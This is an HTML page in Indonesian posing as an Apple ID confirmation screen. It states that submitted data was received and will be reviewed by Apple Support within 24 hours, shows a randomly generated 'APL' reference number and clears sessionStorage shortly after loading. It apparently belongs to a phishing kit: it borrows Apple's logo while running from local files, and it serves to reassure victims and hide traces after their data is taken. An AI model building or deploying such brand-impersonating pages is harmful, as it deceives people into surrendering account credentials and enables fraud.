<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permintaan Diterima - Apple ID</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="https://www.apple.com/favicon.ico">
    <style>
        .success-icon {
            width: 80px;
            height: 80px;
            background-color: #34c759;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
        }
        
        .checkmark {
            width: 40px;
            height: 40px;
            color: white;
        }
        
        .success-message {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .success-message h1 {
            font-size: 28px;
            margin-bottom: 15px;
        }
        
        .success-message p {
            color: #86868b;
            line-height: 1.5;
            margin-bottom: 30px;
        }
        
        .home-button {
            background: transparent;
            border: 1px solid #0071e3;
            color: #0071e3;
        }
        
        .home-button:hover {
            background: rgba(0, 113, 227, 0.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png" alt="Apple Logo" class="logo">
            
            <div class="success-icon">
                <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                    <path fill="none" stroke="white" stroke-width="5" d="M14 27l7.8 7.8L37 16.2"/>
                </svg>
            </div>
            
            <div class="success-message">
                <h1>Data Telah Diterima</h1>
                <p>Tim Dukungan Apple akan meninjau permintaan Anda dalam 24 jam. Terima kasih atas kesabaran Anda.</p>
                <p>Nomor referensi: <strong id="referenceNumber"></strong></p>
            </div>
            
            <button class="home-button" onclick="window.location.href='index.html'">Kembali ke Beranda</button>
            
            <div class="links">
                <a href="#">Bantuan</a>
                <a href="#">Hubungi Apple Support</a>
                <a href="#">Privacy Policy</a>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Generate reference number
            const generateReferenceNumber = () => {
                const prefix = 'APL';
                const timestamp = Date.now().toString().slice(-8);
                const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
                return `${prefix}-${timestamp}-${random}`;
            };
            
            // Set reference number
            document.getElementById('referenceNumber').textContent = generateReferenceNumber();
            
            // Clear sessionStorage
            setTimeout(() => {
                sessionStorage.clear();
            }, 2000);
        });
    </script>
</body>
</html>
